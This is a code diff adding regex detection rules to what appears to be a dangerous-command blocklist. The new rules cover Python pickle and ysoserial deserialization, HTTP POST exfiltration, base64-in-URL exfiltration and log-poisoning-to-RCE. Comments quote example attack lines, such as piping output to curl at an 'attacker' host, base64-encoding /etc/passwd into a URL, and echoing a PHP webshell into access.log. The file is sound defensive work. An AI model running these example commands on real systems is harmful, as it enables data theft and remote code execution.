@@ -1435,6 +1435,31 @@ _CRITICAL_PATTERNS = [
     # pbpaste | nc / pbpaste | curl 把剪贴板内容外带 (剪贴板常含临时粘贴的密钥/令牌)。
     (r"\bpbpaste\b[^\n]*\|\s*(?:nc|ncat|netcat|curl|wget)\b",
      "pbpaste exfil (剪贴板内容经网络外带)"),
+    # ---- round30: 反序列化 RCE (Python pickle / Java ysoserial) ----
+    # pickle.loads 是经典 Python 反序列化 RCE (任意对象构造 = 任意代码执行);
+    # ysoserial 只匹配作为 Java 命令调用 (`java ... ysoserial.GeneratePayload`),
+    # 不匹配 `ls ysoserial/` 或 `cat ysoserial-README.md` 等文件系统引用。
+    (r"\bpickle\.loads?\s*\(", "python pickle deserialization (pickle 反序列化, 任意代码执行)"),
+    (r"\bjava\b[^\n]*ysoserial", "ysoserial Java payload (Java 反序列化 gadget payload 生成, RCE)"),
+    # ---- round30: 管道把命令输出经 HTTP POST 到外部 (数据外带) ----
+    # `... | curl -X POST --data-binary @- http://attacker/` / `wget --post-data @-`
+    # 把本地命令/文件输出直接外带。排除 localhost/内网 (良性本地服务) 后才拦。
+    (r"\|\s*(?:curl|wget)\b[^\n]*--(?:data-binary|data|post-file|post-data)\s*(?:@-|@)"
+     r"[^\n]*https?://(?!localhost|127\.0\.0\.1|0\.0\.0\.0|10\.\d|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)",
+     "pipe to curl/wget POST (命令输出经 HTTP POST 外带)"),
+    # ---- round30: base64 命令替换内嵌 URL 查询 (数据外带) ----
+    # `curl http://attacker/?d=$(base64 -w0 /etc/passwd)` 把敏感文件 base64 后放
+    # URL 查询参数外带。命中: 外部 URL 查询参数中出现 base64 命令替换。
+    (r"https?://[^\n]*\?[^\n]*\$\(\s*(?:base64|base32|openssl\s+enc|xxd)\b",
+     "base64 substitution in URL query (base64 命令替换内嵌 URL 查询, 数据外带)"),
+    # ---- round30: 日志投毒 + LFI 到 RCE (写 webshell 进日志再触发) ----
+    # `echo '<?php system(...) ?>' >> access.log && curl 'http://target/?page=...log'`
+    # 是经典 log-poisoning-to-RCE。需要同时: ① 写日志 (echo/printf/tee/>> PHP payload)
+    # ② 后续 LFI/curl 触发。单独读日志/追加日志是良性, 不拦。
+    (r"\b(?:echo|printf|tee|Set-Content|Add-Content)\b[^\n]*\?[^\n]*(?:php|jsp|aspx|system\s*\(|eval\s*\()[^\n]*"
+     r"(?:>>|>)\s*\S*(?:access\.log|error\.log|mail\.log|auth\.log)"
+     r"[^\n]*(?:&&|;|\|)[^\n]*(?:curl|wget|http|Invoke-WebRequest)",
+     "log poisoning + LFI (日志投毒写入 webshell + LFI 触发, RCE)"),
     # ---- round26: macOS LoginHook (登录时以 root 执行恶意脚本, 持久化) ----
     # `defaults write com.apple.loginwindow LoginHook /path/evil.sh` 让任意脚本在每次
     # 登录时以 root 运行, 是 macOS 经典持久化后门。defaults read/list 是只读查询放行。
